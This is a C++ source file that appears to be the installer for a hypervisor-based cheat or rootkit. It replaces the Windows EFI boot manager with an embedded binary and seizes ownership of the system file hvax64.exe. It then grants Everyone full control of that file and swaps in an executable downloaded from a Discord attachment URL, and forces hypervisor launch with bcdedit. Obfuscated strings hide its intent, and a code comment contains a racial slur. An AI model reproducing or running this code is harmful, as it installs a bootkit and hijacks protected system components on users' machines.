#include "../include.h"
#include "installHypervisor.h"
#include "../chilkat/include/CkByteData.h"
#include <WbemCli.h>
#include <comdef.h>
#include "../API/api.h"
#include "../Utils2.h"
#include <Accctrl.h>
#include <Aclapi.h>
#pragma comment(lib, "wbemuuid.lib")
namespace Hypervisor {


	std::vector<std::string> GetHardwareInfo(const wchar_t* deviceClass, const wchar_t* property)
	{
		using std::cout;
		using std::cin;
		using std::endl;

		static bool hasInit = false;
		if (!hasInit) {
			HRESULT hRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
			if (FAILED(hRes))
			{
				//std::cout << "Unable to launch COM: 0x" << std::hex << hRes << std::endl;
				return std::vector<std::string>{enc("Error")};
			}

			if ((FAILED(hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, 0))))
			{
				//std::cout << "Unable to initialize security: 0x" << std::hex << hRes << std::endl;
				return std::vector<std::string>{enc("Error")};
			}
			hasInit = true;
		}

		HRESULT hRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		IWbemLocator* pLocator = NULL;
		if (FAILED(hRes = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pLocator))))
		{
			//cout << "Unable to create a WbemLocator: " << std::hex << hRes << endl;
			return std::vector<std::string>{enc("Error")};
		}

		IWbemServices* pService = NULL;
		if (FAILED(hRes = pLocator->ConnectServer(_bstr_t(L"root\\CIMV2"), NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pService)))
		{
			pLocator->Release();
			//cout << "Unable to connect to \"CIMV2\": " << std::hex << hRes << endl;
			return std::vector<std::string>{enc("Error")};
		}

		IEnumWbemClassObject* pEnumerator = NULL;
		std::wstring query = std::wstring(L"SELECT * FROM ") + deviceClass;
		if (FAILED(hRes = pService->ExecQuery(_bstr_t(L"WQL"), _bstr_t(query.c_str()), WBEM_FLAG_FORWARD_ONLY, NULL, &pEnumerator)))
		{
			pLocator->Release();
			pService->Release();
			//cout << "Unable to retrive desktop monitors: " << std::hex << hRes << endl;
			return std::vector<std::string>{enc("Error")};
		}

		std::vector<std::string> retValue = std::vector<std::string>{};
		IWbemClassObject* clsObj = NULL;
		int numElems;
		while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
		{
			if (FAILED(hRes))
				break;

			VARIANT vRet;
			VariantInit(&vRet);
			if (SUCCEEDED(clsObj->Get(property, 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
			{
				//std::wcout << L"SerialNumber: " << vRet.bstrVal << endl;
				std::wstring wstr = vRet.bstrVal;
				retValue.push_back(std::string(wstr.begin(), wstr.end()));
				VariantClear(&vRet);
			}

			clsObj->Release();
		}

		pEnumerator->Release();
		pService->Release();
		pLocator->Release();

		return retValue;
	}

	WinArch GetCPUVendor()
	{
		std::string processorName = GetHardwareInfo(L"Win32_Processor", L"Manufacturer")[0];

		if (processorName.find("AMD") != std::string::npos)
			return WinArch::Amd;

		return WinArch::Intel;
	}

	RTL_OSVERSIONINFOW GetOSVersion() {
		HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)::GetProcAddress(hMod, enc("RtlGetVersion"));
		RTL_OSVERSIONINFOW out;
		fxPtr(&out);
		return out;
	}


	std::string _bootmgfwPath = enc("X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");


	BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
		TOKEN_PRIVILEGES tp;
		LUID luid;

		if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
			printf("LookupPrivilegeValue error: %u\n", GetLastError());
			return FALSE;
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

		// Enable the privilege or disable all privileges.
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
			printf("AdjustTokenPrivileges error: %u\n", GetLastError());
			return FALSE;
		}

		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			printf("The token does not have the specified privilege. \n");
			return FALSE;
		}

		return TRUE;
	}

	BOOL TakeOwnership(LPTSTR lpszOwnFile) {
		BOOL bRetval = FALSE;

		HANDLE hToken = NULL;
		PSID pSIDAdmin = NULL;
		PSID pSIDEveryone = NULL;
		PACL pACL = NULL;
		SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
		SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
		const int NUM_ACES = 2;
		EXPLICIT_ACCESS ea[NUM_ACES];
		DWORD dwRes;

		// Specify the DACL to use.
		// Create a SID for the Everyone group.
		if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
			printf("AllocateAndInitializeSid (Everyone) error %u\n", GetLastError());
			goto Cleanup;
		}

		// Create a SID for the BUILTIN\Administrators group.
		if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) {
			printf("AllocateAndInitializeSid (Admin) error %u\n", GetLastError());
			goto Cleanup;
		}

		ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

		// Set read access for Everyone.
		ea[0].grfAccessPermissions = GENERIC_ALL;
		ea[0].grfAccessMode = SET_ACCESS;
		ea[0].grfInheritance = NO_INHERITANCE;
		ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

		// Set full control for Administrators.
		ea[1].grfAccessPermissions = GENERIC_ALL;
		ea[1].grfAccessMode = SET_ACCESS;
		ea[1].grfInheritance = NO_INHERITANCE;
		ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
		ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

		if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES,
			ea,
			NULL,
			&pACL))
		{
			printf("Failed SetEntriesInAcl\n");
			goto Cleanup;
		}

		// Try to modify the object's DACL.
		dwRes = SetNamedSecurityInfo(
			lpszOwnFile,                 // name of the object
			SE_FILE_OBJECT,              // type of object
			DACL_SECURITY_INFORMATION,   // change only the object's DACL
			NULL, NULL,                  // do not change owner or group
			pACL,                        // DACL specified
			NULL);                       // do not change SACL

		if (ERROR_SUCCESS == dwRes)
		{
			printf("Successfully changed DACL\n");
			bRetval = TRUE;
			// No more processing needed.
			goto Cleanup;
		}
		if (dwRes != ERROR_ACCESS_DENIED)
		{
			printf("First SetNamedSecurityInfo call failed: %u\n",
				dwRes);
			goto Cleanup;
		}

		// If the preceding call failed because access was denied, 
		// enable the SE_TAKE_OWNERSHIP_NAME privilege, create a SID for 
		// the Administrators group, take ownership of the object, and 
		// disable the privilege. Then try again to set the object's DACL.

		// Open a handle to the access token for the calling process.
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES,
			&hToken))
		{
			printf("OpenProcessToken failed: %u\n", GetLastError());
			goto Cleanup;
		}

		// Enable the SE_TAKE_OWNERSHIP_NAME privilege.
		if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
		{
			printf("You must be logged on as Administrator.\n");
			goto Cleanup;
		}

		// Set the owner in the object's security descriptor.
		dwRes = SetNamedSecurityInfo(
			lpszOwnFile,                 // name of the object
			SE_FILE_OBJECT,              // type of object
			OWNER_SECURITY_INFORMATION,  // change only the object's owner
			pSIDAdmin,                   // SID of Administrator group
			NULL,
			NULL,
			NULL);

		if (dwRes != ERROR_SUCCESS)
		{
			printf("Could not set owner. Error: %u\n", dwRes);
			goto Cleanup;
		}

		// Disable the SE_TAKE_OWNERSHIP_NAME privilege.
		if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
		{
			printf("Failed SetPrivilege call unexpectedly.\n");
			goto Cleanup;
		}

		// Try again to modify the object's DACL,
		// now that we are the owner.
		dwRes = SetNamedSecurityInfo(
			lpszOwnFile,                 // name of the object
			SE_FILE_OBJECT,              // type of object
			DACL_SECURITY_INFORMATION,   // change only the object's DACL
			NULL, NULL,                  // do not change owner or group
			pACL,                        // DACL specified
			NULL);                       // do not change SACL

		if (dwRes == ERROR_SUCCESS)
		{
			printf("Successfully changed DACL\n");
			bRetval = TRUE;
		}
		else
		{
			printf("Second SetNamedSecurityInfo call failed: %u\n",
				dwRes);
		}

	Cleanup:

		if (pSIDAdmin)
			FreeSid(pSIDAdmin);

		if (pSIDEveryone)
			FreeSid(pSIDEveryone);

		if (pACL)
			LocalFree(pACL);

		if (hToken)
			CloseHandle(hToken);

		return bRetval;
	}

	/*std::wstring GetExeDirectory() {
		TCHAR buffer[MAX_PATH] = { 0 };
		GetModuleFileName(NULL, buffer, MAX_PATH);
		std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
		return std::wstring(buffer).substr(0, pos);
	}*/


	bool Install() {

		//Check windows version
		auto OS = GetOSVersion();
		WinArch CPU = GetCPUVendor();
		WinVer buildNumber = (WinVer)OS.dwBuildNumber;
		std::string brand = enc("");
		std::string build = enc("");
		if (CPU == WinArch::Intel) {
			if (buildNumber != WinVer::WinVer1903) {
				if (buildNumber != WinVer::WinVer1909) {
					if (buildNumber != WinVer::WinVer2004) {
						if (buildNumber != WinVer::WinVer20H2) {
							if (buildNumber != WinVer::WinVer21H1) {
								if (buildNumber != WinVer::WinVer21H2) {
									if (buildNumber != WinVer::WinVer22H2) {
										MessageBoxA(NULL, enc("Unsupported Windows version Intel"), NULL, MB_OK);
										return false;
									}
								}
							}
						}
					}
				}
			}
		
			brand = enc("intel");
			if (buildNumber >= WinVer::WinVer2004) { //Hypervisor 2004 on intel supports upto 21h2 atleast, untested on win11
				build = std::to_string((DWORD)WinVer::WinVer2004);
			} else
				build = std::to_string((DWORD)buildNumber);

		} else if (CPU == WinArch::Amd) {
			if (buildNumber != WinVer::WinVer1903) {
				if (buildNumber != WinVer::WinVer1909) {
					if (buildNumber != WinVer::WinVer2004) {
						if (buildNumber != WinVer::WinVer20H2) {
							if (buildNumber != WinVer::WinVer21H1) {
								if (buildNumber != WinVer::WinVer21H2) {
									if (buildNumber != WinVer::WinVer22H2) {
										MessageBoxA(NULL, enc("Unsupported Windows version AMD"), NULL, MB_OK);
										return false;
									}
								}
							}
						}
					}
				}
			}
			brand = enc("amd");
			if (buildNumber == WinVer::WinVer21H1) buildNumber = WinVer::WinVer21H2;
			build = std::to_string((DWORD)buildNumber);
		}
		else {
			//Not supported
			MessageBoxA(NULL, enc("Unsupportable CPU"), NULL, MB_OK);
			return false;
		}
		

		// Mount, Take of attributes
		system("mountvol X: /S");
		system(("attrib -s -h " + _bootmgfwPath).c_str());


		// Check backup
		std::string backupPath = _bootmgfwPath + ".backup";
		if (std::filesystem::exists(backupPath)) {
			MessageBoxA(NULL, enc("Backup already exists"), NULL, MB_OK);
			return false;

		}

		std::filesystem::rename(_bootmgfwPath, backupPath);
		if (!std::filesystem::exists(backupPath)) {
			MessageBoxA(NULL, enc("failed to rename boot drive"), NULL, NULL);
			return false;
		}

		try {
			

			CkByteData data;
	
			data.append2(efi.data(), efi.size());
			data.saveFile(_bootmgfwPath.c_str());
			data.clear();
		}
		catch (...) {

		}

		if (!std::filesystem::exists(_bootmgfwPath)) {
			std::filesystem::rename(backupPath, _bootmgfwPath); //Restore
			MessageBoxA(NULL, enc("failed to download boot drive"), NULL, NULL);
			return false;
		}


		//Take ownership of file for AMD niggas
		if (brand == enc("amd")) {
			//takeown /f c:\windows\system32\osk.exe
			//system("takeown /f c:\\windows\\system32\\hvax64.exe");
			//system("attrib -s -h c:\\windows\\system32\\hvax64.exe");

			if (std::filesystem::exists(enc("c:\\windows\\system32\\hvax64.exe.backup"))) {
				//Rename our own hvax to hvax64.exe
				std::filesystem::remove(enc("c:\\windows\\system32\\hvax64.exe.backup"));
			}
			TakeOwnership((LPTSTR)"c:\\windows\\system32\\hvax64.exe");


			//Download File
			URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/993417241032937533/1058901577194274856/hvax64a.exe", "c:\\windows\\system32\\testttt.exe", BINDF_GETNEWESTVERSION, NULL);

			//Rename old name
			std::filesystem::rename(enc("c:\\windows\\system32\\hvax64.exe"), enc("c:\\windows\\system32\\hvax64.exe.backup"));

			//Confirm it's renamed 
			if (std::filesystem::exists(enc("c:\\windows\\system32\\hvax64.exe.backup"))) {
				//Rename our own hvax to hvax64.exe
				std::filesystem::rename(enc("c:\\windows\\system32\\testttt.exe"), enc("c:\\windows\\system32\\hvax64.exe"));
			}
			else {
				MessageBoxA(NULL, enc("Failed to take over system module"), NULL, NULL);
				return false;
			}
		}
		// Hypervisor
		system("BCDEDIT /Set {current} hypervisorlaunchtype auto");

		return true;
	}

}